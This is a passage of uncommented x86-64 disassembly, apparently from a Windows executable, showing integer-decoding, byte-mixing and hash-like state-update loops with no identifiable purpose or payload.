   14004dd6e:	sub    rdx,rax
   14004dd71:	mov    rcx,QWORD PTR [rbp+0xd20]
   14004dd78:	cmp    rdx,rcx
   14004dd7b:	cmovae rdx,rcx
   14004dd7f:	cmp    rdx,0x1
   14004dd83:	adc    rdx,0x0
   14004dd87:	mov    r10d,ecx
   14004dd8a:	sub    r10d,edx
   14004dd8d:	and    r10b,0x3f
   14004dd91:	cmp    rcx,rdx
   14004dd94:	movzx  ecx,r10b
   14004dd98:	mov    r10d,0x0
   14004dd9e:	cmovbe ecx,r10d
   14004dda2:	shr    r11,cl
   14004dda5:	mov    r10,QWORD PTR [rbp+0xdb0]
   14004ddac:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14004ddb3:	mov    ecx,edx
   14004ddb5:	shld   rsi,r10,cl
   14004ddb9:	shl    r10,cl
   14004ddbc:	test   dl,0x40
   14004ddbf:	cmovne rsi,r10
   14004ddc3:	mov    ecx,0x0
   14004ddc8:	cmove  rcx,r10
   14004ddcc:	or     rcx,r11
   14004ddcf:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004ddd6:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004dddd:	add    rax,rdx
   14004dde0:	mov    QWORD PTR [rbp+0xdc0],rax
   14004dde7:	jmp    0x14004d88f
   14004ddec:	add    rax,0xfffffffffffffff8
   14004ddf0:	mov    QWORD PTR [rbp+0xdc0],rax
   14004ddf7:	mov    r9,QWORD PTR [rbp+0xdb8]
   14004ddfe:	mov    r10,r9
   14004de01:	mov    ecx,eax
   14004de03:	shr    r10,cl
   14004de06:	mov    r11,QWORD PTR [rbp+0xdb0]
   14004de0d:	mov    rdx,r11
   14004de10:	shrd   rdx,r9,cl
   14004de14:	push   0xffffffffffffffff
   14004de16:	pop    rdi
   14004de17:	mov    rsi,rdi
   14004de1a:	shl    rsi,cl
   14004de1d:	test   al,0x40
   14004de1f:	cmovne rdx,r10
   14004de23:	mov    ecx,0x0
   14004de28:	cmove  rcx,rsi
   14004de2c:	cmove  rsi,rdi
   14004de30:	not    rsi
   14004de33:	not    rcx
   14004de36:	and    rcx,r11
   14004de39:	and    rsi,r9
   14004de3c:	test   rax,rax
   14004de3f:	cmove  rsi,rax
   14004de43:	cmove  rcx,rax
   14004de47:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004de4e:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004de55:	add    r8,0x8
   14004de59:	mov    QWORD PTR [rbp+0xdc8],r8
   14004de60:	inc    rbx
   14004de63:	lea    rcx,[rbp+0x500]
   14004de6a:	call   0x14003c141
   14004de6f:	jmp    0x14004d860
   14004de74:	mov    rax,QWORD PTR [rbp+0x500]
   14004de7b:	mov    QWORD PTR [rbp+0xf68],rax
   14004de82:	mov    rax,QWORD PTR [rbp+0x508]
   14004de89:	mov    QWORD PTR [rbp+0x1160],rax
   14004de90:	mov    rax,QWORD PTR [rbp+0x510]
   14004de97:	mov    QWORD PTR [rbp+0x1148],rax
   14004de9e:	lea    rcx,[rbp+0x500]
   14004dea5:	push   0x3a
   14004dea7:	pop    rdx
   14004dea8:	call   0x14003c111
   14004dead:	xor    ebx,ebx
   14004deaf:	cmp    rbx,0x3a
   14004deb3:	je     0x14004e4c3
   14004deb9:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004dec0:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004dec7:	lea    rax,[r8+0x8]
   14004decb:	cmp    rax,r9
   14004dece:	jbe    0x14004ded7
   14004ded0:	xor    edx,edx
   14004ded2:	jmp    0x14004e4af
   14004ded7:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004dede:	cmp    rax,0x8
   14004dee2:	jae    0x14004e43b
   14004dee8:	mov    rcx,QWORD PTR [rbp+0xd60]
   14004deef:	cmp    rcx,QWORD PTR [rbp+0xd68]
   14004def6:	jae    0x14004df3c
   14004def8:	mov    rcx,QWORD PTR [rbp+0xd18]
   14004deff:	mov    rdx,QWORD PTR [rbp+0xd58]
   14004df06:	cmp    rdx,rcx
   14004df09:	jae    0x14004df3c
   14004df0b:	lea    rax,[r15+0x10]
   14004df0f:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14004df14:	and    r13d,0x7f
   14004df18:	lea    rax,[rdx+0x1]
   14004df1c:	cmp    rax,rcx
   14004df1f:	jae    0x14004df4a
   14004df21:	movzx  r8d,BYTE PTR [r15+rdx*1+0x11]
   14004df27:	test   r8b,r8b
   14004df2a:	jns    0x14004df44
   14004df2c:	shl    r13,0x7
   14004df30:	and    r8d,0x7f
   14004df34:	or     r13,r8
   14004df37:	mov    rdx,rax
   14004df3a:	jmp    0x14004df18
   14004df3c:	xor    r11d,r11d
   14004df3f:	jmp    0x14004e3b7
   14004df44:	inc    rdx
   14004df47:	mov    rcx,rdx
   14004df4a:	mov    QWORD PTR [rbp+0xd58],rcx
   14004df51:	mov    rax,r13
   14004df54:	shr    rax,0x8
   14004df58:	mov    rsi,r13
   14004df5b:	shr    rsi,0x28
   14004df5f:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004df66:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004df6d:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004df74:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004df7b:	mov    DWORD PTR [rbp+0x7d0],eax
   14004df81:	lea    rax,[rip+0x3a0d0]        # 0x140088058
   14004df88:	mov    QWORD PTR [rsp+0x20],rax
   14004df8d:	lea    rcx,[rbp+0xf80]
   14004df94:	push   0x4
   14004df96:	pop    rdx
   14004df97:	lea    r8,[rbp+0x7d0]
   14004df9e:	mov    r9,rdx
   14004dfa1:	call   0x1400638fe
   14004dfa6:	mov    BYTE PTR [rbp+0xf84],sil
   14004dfad:	mov    rsi,QWORD PTR [rbp+0xd30]
   14004dfb4:	cmp    QWORD PTR [rbp+0xd78],rsi
   14004dfbb:	jbe    0x14004e0eb
   14004dfc1:	mov    r9,QWORD PTR [rbp+0xd38]
   14004dfc8:	cmp    r9,0x4
   14004dfcc:	ja     0x140059d9c
   14004dfd2:	mov    rcx,QWORD PTR [rbp+0xd40]
   14004dfd9:	cmp    rcx,0x5
   14004dfdd:	jae    0x140059dae
   14004dfe3:	mov    r8,QWORD PTR [rbp+0xd78]
   14004dfea:	cmp    r8,rsi
   14004dfed:	je     0x140059dbc
   14004dff3:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   14004dffa:	mov    cl,BYTE PTR [rbp+0xd48]
   14004e000:	rol    eax,cl
   14004e002:	sub    r8,rsi
   14004e005:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   14004e00d:	xor    edx,edx
   14004e00f:	div    r8
   14004e012:	mov    rdi,rdx
   14004e015:	mov    rax,QWORD PTR [rbp+0xd80]
   14004e01c:	mov    QWORD PTR [rbp+0x1060],rax
   14004e023:	cmp    rsi,0x40
   14004e027:	push   0x40
   14004e029:	pop    rax
   14004e02a:	cmovae rsi,rax
   14004e02e:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004e035:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004e03c:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004e043:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004e04a:	lea    rcx,[rbp+0x7d0]
   14004e051:	mov    rdx,rsi
   14004e054:	call   0x14003c0b8
   14004e059:	mov    r10,QWORD PTR [rbp+0xd78]
   14004e060:	test   r10,r10
   14004e063:	je     0x14004e0b1
   14004e065:	mov    rcx,rax
   14004e068:	mov    r8,rdx
   14004e06b:	mov    rax,rdx
   14004e06e:	add    rax,rdi
   14004e071:	mov    r9,QWORD PTR [rbp+0xd70]
   14004e078:	cmp    rax,r10
   14004e07b:	jbe    0x14004e09b
   14004e07d:	xor    r11d,r11d
   14004e080:	cmp    r8,r11
   14004e083:	je     0x14004e0b1
   14004e085:	lea    rax,[r11+rdi*1]
   14004e089:	xor    edx,edx
   14004e08b:	div    r10
   14004e08e:	mov    al,BYTE PTR [r9+rdx*1]
   14004e092:	mov    BYTE PTR [rcx+r11*1],al
   14004e096:	inc    r11
   14004e099:	jmp    0x14004e080
   14004e09b:	add    r9,rdi
   14004e09e:	xor    eax,eax
   14004e0a0:	cmp    r8,rax
   14004e0a3:	je     0x14004e0b1
   14004e0a5:	mov    dl,BYTE PTR [r9+rax*1]
   14004e0a9:	mov    BYTE PTR [rcx+rax*1],dl
   14004e0ac:	inc    rax
   14004e0af:	jmp    0x14004e0a0
   14004e0b1:	mov    rcx,QWORD PTR [rbp+0xd28]
   14004e0b8:	xor    eax,eax
   14004e0ba:	cmp    rsi,rax
   14004e0bd:	je     0x14004e0eb
   14004e0bf:	cmp    rcx,0x3f
   14004e0c3:	ja     0x140059d8e
   14004e0c9:	mov    edx,eax
   14004e0cb:	and    edx,0x7
   14004e0ce:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14004e0d5:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004e0dc:	inc    rax
   14004e0df:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14004e0e6:	inc    rcx
   14004e0e9:	jmp    0x14004e0ba
   14004e0eb:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004e0f2:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004e0f9:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004e100:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004e107:	xor    eax,eax
   14004e109:	cmp    rax,0x40
   14004e10d:	je     0x14004e125
   14004e10f:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14004e116:	bswap  ecx
   14004e118:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004e11f:	add    rax,0x4
   14004e123:	jmp    0x14004e109
   14004e125:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   14004e12c:	mov    eax,DWORD PTR [rbp+0xd98]
   14004e132:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004e139:	mov    DWORD PTR [rbp+0x7e0],eax
   14004e13f:	and    DWORD PTR [rbp+0x7e4],0x0
   14004e146:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   14004e14d:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004e154:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   14004e15b:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004e162:	lea    rax,[rbp+0x7e8]
   14004e169:	movups XMMWORD PTR [rax+0x30],xmm3
   14004e16d:	movups XMMWORD PTR [rax+0x20],xmm2
   14004e171:	movups XMMWORD PTR [rax+0x10],xmm1
   14004e175:	movups XMMWORD PTR [rax],xmm0
   14004e178:	call   0x140064214
   14004e17d:	mov    al,BYTE PTR [rip+0x4a90a]        # 0x140098a8d
   14004e183:	cmp    al,0x1
   14004e185:	je     0x14004e1ce
   14004e187:	movzx  eax,al
   14004e18a:	cmp    eax,0x2
   14004e18d:	je     0x14004e274
   14004e193:	and    DWORD PTR [rbp+0x400],0x0
   14004e19a:	lea    rcx,[rip+0xfffffffffffb2edf]        # 0x140001080
   14004e1a1:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004e1a8:	push   0x40
   14004e1aa:	pop    r8
   14004e1ac:	lea    r9,[rbp+0x400]
   14004e1b3:	call   QWORD PTR [rip+0x4664f]        # 0x140094808
   14004e1b9:	test   eax,eax
   14004e1bb:	sete   cl
   14004e1be:	inc    cl
   14004e1c0:	mov    BYTE PTR [rip+0x4a8c7],cl        # 0x140098a8d
   14004e1c6:	test   eax,eax
   14004e1c8:	je     0x14004e274
   14004e1ce:	mov    al,BYTE PTR [rip+0x4a9e4]        # 0x140098bb8
   14004e1d4:	cmp    al,0x1
   14004e1d6:	je     0x14004e1fb
   14004e1d8:	movzx  eax,al
   14004e1db:	test   eax,eax
   14004e1dd:	jne    0x14004e274
   14004e1e3:	call   0x140065d51
   14004e1e8:	test   rax,rax
   14004e1eb:	sete   cl
   14004e1ee:	inc    cl
   14004e1f0:	mov    BYTE PTR [rip+0x4a9c2],cl        # 0x140098bb8
   14004e1f6:	test   rax,rax
   14004e1f9:	je     0x14004e274
   14004e1fb:	call   0x140064227
   14004e200:	mov    eax,0xc8c291de
   14004e205:	xchg   DWORD PTR [rip+0x4a8d5],eax        # 0x140098ae0
   14004e20b:	call   QWORD PTR [rip+0x4643f]        # 0x140094650
   14004e211:	mov    eax,eax
   14004e213:	mov    QWORD PTR [rip+0x49de6],rax        # 0x140098000
   14004e21a:	lea    rcx,[rbp+0x7d0]
   14004e221:	push   0xffffffffffffffff
   14004e223:	pop    rdx
   14004e224:	call   0x14002b840
   14004e229:	xor    eax,eax
   14004e22b:	xchg   DWORD PTR [rip+0x4a8af],eax        # 0x140098ae0
   14004e231:	mov    BYTE PTR [rip+0x4a856],0x0        # 0x140098a8e
   14004e238:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004e23e:	add    DWORD PTR [rbp+0xd88],eax
   14004e244:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004e24a:	add    DWORD PTR [rbp+0xd8c],eax
   14004e250:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004e256:	add    DWORD PTR [rbp+0xd90],eax
   14004e25c:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004e262:	add    DWORD PTR [rbp+0xd94],eax
   14004e268:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004e26e:	add    DWORD PTR [rbp+0xd98],eax
   14004e274:	mov    BYTE PTR [rip+0x4a811],0x0        # 0x140098a8c
   14004e27b:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004e282:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004e289:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004e290:	xor    eax,eax
   14004e292:	cmp    rax,0x14
   14004e296:	je     0x14004e2ae
   14004e298:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   14004e29f:	bswap  ecx
   14004e2a1:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   14004e2a8:	add    rax,0x4
   14004e2ac:	jmp    0x14004e292
   14004e2ae:	mov    r8,QWORD PTR [rbp+0xd20]
   14004e2b5:	mov    eax,r13d
   14004e2b8:	shr    eax,0x3
   14004e2bb:	and    eax,0x1f
   14004e2be:	lea    rcx,[rax+rbp*1]
   14004e2c2:	add    rcx,0x7d0
   14004e2c9:	xor    r9d,r9d
   14004e2cc:	xor    edx,edx
   14004e2ce:	xor    eax,eax
   14004e2d0:	cmp    r9,0x10
   14004e2d4:	je     0x14004e2ef
   14004e2d6:	shld   rax,rdx,0x8
   14004e2db:	mov    r10,rdx
   14004e2de:	shl    r10,0x8
   14004e2e2:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004e2e7:	inc    r9
   14004e2ea:	or     rdx,r10
   14004e2ed:	jmp    0x14004e2d0
   14004e2ef:	push   0xffffffffffffffff
   14004e2f1:	pop    r9
   14004e2f3:	mov    r10,r9
   14004e2f6:	mov    ecx,r8d
   14004e2f9:	shl    r10,cl
   14004e2fc:	cmp    r8,0x40
   14004e300:	not    r10
   14004e303:	cmovae r10,r9
   14004e307:	and    r13d,0x7
   14004e30b:	lea    ecx,[r8+r13*1]
   14004e30f:	neg    cl
   14004e311:	shrd   rdx,rax,cl
   14004e315:	shr    rax,cl
   14004e318:	test   cl,0x40
   14004e31b:	cmove  rax,rdx
   14004e31f:	and    rax,r10
   14004e322:	mov    rsi,QWORD PTR [rbp+0xd60]
   14004e329:	add    r8,0x7
   14004e32d:	bswap  rax
   14004e330:	shr    r8,0x3
   14004e334:	mov    QWORD PTR [rbp+0x1060],rax
   14004e33b:	mov    r9,rsi
   14004e33e:	imul   r9,r8
   14004e342:	push   0x8
   14004e344:	pop    rcx
   14004e345:	sub    rcx,r8
   14004e348:	dec    r8
   14004e34b:	mov    rax,QWORD PTR [rbp+0x1168]
   14004e352:	lea    r11,[rax+r9*1]
   14004e356:	mov    rax,r9
   14004e359:	xor    edx,edx
   14004e35b:	push   0x14
   14004e35d:	pop    rdi
   14004e35e:	div    rdi
   14004e361:	cmp    rcx,0x8
   14004e365:	je     0x14004e38b
   14004e367:	cmp    r8,0x7
   14004e36b:	ja     0x140059d80
   14004e371:	imul   rax,rax,0xffffffffffffffec
   14004e375:	mov    al,BYTE PTR [r11+rax*1]
   14004e379:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14004e380:	inc    rcx
   14004e383:	inc    r11
   14004e386:	inc    r9
   14004e389:	jmp    0x14004e356
   14004e38b:	mov    r11,QWORD PTR [rbp+0x1060]
   14004e392:	bswap  r11
   14004e395:	and    r11,r10
   14004e398:	inc    rsi
   14004e39b:	mov    QWORD PTR [rbp+0xd60],rsi
   14004e3a2:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004e3a9:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004e3b0:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004e3b7:	mov    rdx,r9
   14004e3ba:	sub    rdx,r8
   14004e3bd:	sub    rdx,rax
   14004e3c0:	mov    rcx,QWORD PTR [rbp+0xd20]
   14004e3c7:	cmp    rdx,rcx
   14004e3ca:	cmovae rdx,rcx
   14004e3ce:	cmp    rdx,0x1
   14004e3d2:	adc    rdx,0x0
   14004e3d6:	mov    r10d,ecx
   14004e3d9:	sub    r10d,edx
   14004e3dc:	and    r10b,0x3f
   14004e3e0:	cmp    rcx,rdx
   14004e3e3:	movzx  ecx,r10b
   14004e3e7:	mov    r10d,0x0
   14004e3ed:	cmovbe ecx,r10d
   14004e3f1:	shr    r11,cl
   14004e3f4:	mov    r10,QWORD PTR [rbp+0xdb0]
   14004e3fb:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14004e402:	mov    ecx,edx
   14004e404:	shld   rsi,r10,cl
   14004e408:	shl    r10,cl
   14004e40b:	test   dl,0x40
   14004e40e:	cmovne rsi,r10
   14004e412:	mov    ecx,0x0
   14004e417:	cmove  rcx,r10
   14004e41b:	or     rcx,r11
   14004e41e:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004e425:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004e42c:	add    rax,rdx
   14004e42f:	mov    QWORD PTR [rbp+0xdc0],rax
   14004e436:	jmp    0x14004dede
   14004e43b:	add    rax,0xfffffffffffffff8
   14004e43f:	mov    QWORD PTR [rbp+0xdc0],rax
   14004e446:	mov    r9,QWORD PTR [rbp+0xdb8]
   14004e44d:	mov    r10,r9
   14004e450:	mov    ecx,eax
   14004e452:	shr    r10,cl
   14004e455:	mov    r11,QWORD PTR [rbp+0xdb0]
   14004e45c:	mov    rdx,r11
   14004e45f:	shrd   rdx,r9,cl
   14004e463:	push   0xffffffffffffffff
   14004e465:	pop    rdi
   14004e466:	mov    rsi,rdi
   14004e469:	shl    rsi,cl
   14004e46c:	test   al,0x40
   14004e46e:	cmovne rdx,r10
   14004e472:	mov    ecx,0x0
   14004e477:	cmove  rcx,rsi
   14004e47b:	cmove  rsi,rdi
   14004e47f:	not    rsi
   14004e482:	not    rcx
   14004e485:	and    rcx,r11
   14004e488:	and    rsi,r9
   14004e48b:	test   rax,rax
   14004e48e:	cmove  rsi,rax
   14004e492:	cmove  rcx,rax
   14004e496:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004e49d:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004e4a4:	add    r8,0x8
   14004e4a8:	mov    QWORD PTR [rbp+0xdc8],r8
   14004e4af:	inc    rbx
   14004e4b2:	lea    rcx,[rbp+0x500]
   14004e4b9:	call   0x14003c141
   14004e4be:	jmp    0x14004deaf
   14004e4c3:	mov    rcx,QWORD PTR [rbp+0x500]
   14004e4ca:	mov    rdx,QWORD PTR [rbp+0x508]
   14004e4d1:	call   0x14006f7f7
   14004e4d6:	lea    rcx,[rbp+0x500]
   14004e4dd:	push   0x8
   14004e4df:	pop    rdx
   14004e4e0:	call   0x14003c111
   14004e4e5:	xor    ebx,ebx
   14004e4e7:	cmp    rbx,0x8
   14004e4eb:	je     0x14004eafb
   14004e4f1:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004e4f8:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004e4ff:	lea    rax,[r8+0x8]
   14004e503:	cmp    rax,r9
   14004e506:	jbe    0x14004e50f
   14004e508:	xor    edx,edx
   14004e50a:	jmp    0x14004eae7
   14004e50f:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004e516:	cmp    rax,0x8
   14004e51a:	jae    0x14004ea73
   14004e520:	mov    rcx,QWORD PTR [rbp+0xd60]
   14004e527:	cmp    rcx,QWORD PTR [rbp+0xd68]
   14004e52e:	jae    0x14004e574
   14004e530:	mov    rcx,QWORD PTR [rbp+0xd18]
   14004e537:	mov    rdx,QWORD PTR [rbp+0xd58]
   14004e53e:	cmp    rdx,rcx
   14004e541:	jae    0x14004e574
   14004e543:	lea    rax,[r15+0x10]
   14004e547:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14004e54c:	and    r13d,0x7f
   14004e550:	lea    rax,[rdx+0x1]
   14004e554:	cmp    rax,rcx
   14004e557:	jae    0x14004e582
   14004e559:	movzx  r8d,BYTE PTR [r15+rdx*1+0x11]
   14004e55f:	test   r8b,r8b
   14004e562:	jns    0x14004e57c
   14004e564:	shl    r13,0x7
   14004e568:	and    r8d,0x7f
   14004e56c:	or     r13,r8
   14004e56f:	mov    rdx,rax
   14004e572:	jmp    0x14004e550
   14004e574:	xor    r11d,r11d
   14004e577:	jmp    0x14004e9ef
   14004e57c:	inc    rdx
   14004e57f:	mov    rcx,rdx
   14004e582:	mov    QWORD PTR [rbp+0xd58],rcx
   14004e589:	mov    rax,r13
   14004e58c:	shr    rax,0x8
   14004e590:	mov    rsi,r13
   14004e593:	shr    rsi,0x28
   14004e597:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004e59e:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004e5a5:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004e5ac:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004e5b3:	mov    DWORD PTR [rbp+0x7d0],eax
   14004e5b9:	lea    rax,[rip+0x39a98]        # 0x140088058
   14004e5c0:	mov    QWORD PTR [rsp+0x20],rax
   14004e5c5:	lea    rcx,[rbp+0xf80]
   14004e5cc:	push   0x4
   14004e5ce:	pop    rdx
   14004e5cf:	lea    r8,[rbp+0x7d0]
   14004e5d6:	mov    r9,rdx
   14004e5d9:	call   0x1400638fe
   14004e5de:	mov    BYTE PTR [rbp+0xf84],sil
   14004e5e5:	mov    rsi,QWORD PTR [rbp+0xd30]
   14004e5ec:	cmp    QWORD PTR [rbp+0xd78],rsi
   14004e5f3:	jbe    0x14004e723
   14004e5f9:	mov    r9,QWORD PTR [rbp+0xd38]
   14004e600:	cmp    r9,0x4
   14004e604:	ja     0x140059d9c
   14004e60a:	mov    rcx,QWORD PTR [rbp+0xd40]
   14004e611:	cmp    rcx,0x5
   14004e615:	jae    0x140059dae
   14004e61b:	mov    r8,QWORD PTR [rbp+0xd78]
   14004e622:	cmp    r8,rsi
   14004e625:	je     0x140059dbc
   14004e62b:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   14004e632:	mov    cl,BYTE PTR [rbp+0xd48]
   14004e638:	rol    eax,cl
   14004e63a:	sub    r8,rsi
   14004e63d:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   14004e645:	xor    edx,edx
   14004e647:	div    r8
   14004e64a:	mov    rdi,rdx
   14004e64d:	mov    rax,QWORD PTR [rbp+0xd80]
   14004e654:	mov    QWORD PTR [rbp+0x1060],rax
   14004e65b:	cmp    rsi,0x40
   14004e65f:	push   0x40
   14004e661:	pop    rax
   14004e662:	cmovae rsi,rax
   14004e666:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004e66d:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004e674:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004e67b:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004e682:	lea    rcx,[rbp+0x7d0]
   14004e689:	mov    rdx,rsi
   14004e68c:	call   0x14003c0b8
   14004e691:	mov    r10,QWORD PTR [rbp+0xd78]
   14004e698:	test   r10,r10
   14004e69b:	je     0x14004e6e9
   14004e69d:	mov    rcx,rax
   14004e6a0:	mov    r8,rdx
   14004e6a3:	mov    rax,rdx
   14004e6a6:	add    rax,rdi
   14004e6a9:	mov    r9,QWORD PTR [rbp+0xd70]
   14004e6b0:	cmp    rax,r10
   14004e6b3:	jbe    0x14004e6d3
   14004e6b5:	xor    r11d,r11d
   14004e6b8:	cmp    r8,r11
   14004e6bb:	je     0x14004e6e9
   14004e6bd:	lea    rax,[r11+rdi*1]
   14004e6c1:	xor    edx,edx
   14004e6c3:	div    r10
   14004e6c6:	mov    al,BYTE PTR [r9+rdx*1]
   14004e6ca:	mov    BYTE PTR [rcx+r11*1],al
   14004e6ce:	inc    r11
   14004e6d1:	jmp    0x14004e6b8
   14004e6d3:	add    r9,rdi
   14004e6d6:	xor    eax,eax
   14004e6d8:	cmp    r8,rax
   14004e6db:	je     0x14004e6e9
   14004e6dd:	mov    dl,BYTE PTR [r9+rax*1]
   14004e6e1:	mov    BYTE PTR [rcx+rax*1],dl
   14004e6e4:	inc    rax
   14004e6e7:	jmp    0x14004e6d8
   14004e6e9:	mov    rcx,QWORD PTR [rbp+0xd28]
   14004e6f0:	xor    eax,eax
   14004e6f2:	cmp    rsi,rax
   14004e6f5:	je     0x14004e723
   14004e6f7:	cmp    rcx,0x3f
   14004e6fb:	ja     0x140059d8e
   14004e701:	mov    edx,eax
   14004e703:	and    edx,0x7
   14004e706:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14004e70d:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004e714:	inc    rax
   14004e717:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14004e71e:	inc    rcx
   14004e721:	jmp    0x14004e6f2
   14004e723:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004e72a:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004e731:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004e738:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004e73f:	xor    eax,eax
   14004e741:	cmp    rax,0x40
   14004e745:	je     0x14004e75d
   14004e747:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14004e74e:	bswap  ecx
   14004e750:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004e757:	add    rax,0x4
   14004e75b:	jmp    0x14004e741
   14004e75d:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   14004e764:	mov    eax,DWORD PTR [rbp+0xd98]
   14004e76a:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004e771:	mov    DWORD PTR [rbp+0x7e0],eax
   14004e777:	and    DWORD PTR [rbp+0x7e4],0x0
   14004e77e:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   14004e785:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004e78c:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   14004e793:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004e79a:	lea    rax,[rbp+0x7e8]
   14004e7a1:	movups XMMWORD PTR [rax+0x30],xmm3
   14004e7a5:	movups XMMWORD PTR [rax+0x20],xmm2
   14004e7a9:	movups XMMWORD PTR [rax+0x10],xmm1
   14004e7ad:	movups XMMWORD PTR [rax],xmm0
   14004e7b0:	call   0x140064214
   14004e7b5:	mov    al,BYTE PTR [rip+0x4a2d2]        # 0x140098a8d
   14004e7bb:	cmp    al,0x1
   14004e7bd:	je     0x14004e806
   14004e7bf:	movzx  eax,al
   14004e7c2:	cmp    eax,0x2
   14004e7c5:	je     0x14004e8ac
   14004e7cb:	and    DWORD PTR [rbp+0x400],0x0
   14004e7d2:	lea    rcx,[rip+0xfffffffffffb28a7]        # 0x140001080
   14004e7d9:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004e7e0:	push   0x40
   14004e7e2:	pop    r8
   14004e7e4:	lea    r9,[rbp+0x400]
   14004e7eb:	call   QWORD PTR [rip+0x46017]        # 0x140094808
   14004e7f1:	test   eax,eax
   14004e7f3:	sete   cl
   14004e7f6:	inc    cl
   14004e7f8:	mov    BYTE PTR [rip+0x4a28f],cl        # 0x140098a8d
   14004e7fe:	test   eax,eax
   14004e800:	je     0x14004e8ac
   14004e806:	mov    al,BYTE PTR [rip+0x4a3ac]        # 0x140098bb8
   14004e80c:	cmp    al,0x1
   14004e80e:	je     0x14004e833
   14004e810:	movzx  eax,al
   14004e813:	test   eax,eax
   14004e815:	jne    0x14004e8ac
   14004e81b:	call   0x140065d51
   14004e820:	test   rax,rax
   14004e823:	sete   cl
   14004e826:	inc    cl
   14004e828:	mov    BYTE PTR [rip+0x4a38a],cl        # 0x140098bb8
   14004e82e:	test   rax,rax
   14004e831:	je     0x14004e8ac
   14004e833:	call   0x140064227
   14004e838:	mov    eax,0xc8c291de
   14004e83d:	xchg   DWORD PTR [rip+0x4a29d],eax        # 0x140098ae0
   14004e843:	call   QWORD PTR [rip+0x45e07]        # 0x140094650
   14004e849:	mov    eax,eax
   14004e84b:	mov    QWORD PTR [rip+0x497ae],rax        # 0x140098000
   14004e852:	lea    rcx,[rbp+0x7d0]
   14004e859:	push   0xffffffffffffffff
   14004e85b:	pop    rdx
   14004e85c:	call   0x14002b840
   14004e861:	xor    eax,eax
   14004e863:	xchg   DWORD PTR [rip+0x4a277],eax        # 0x140098ae0
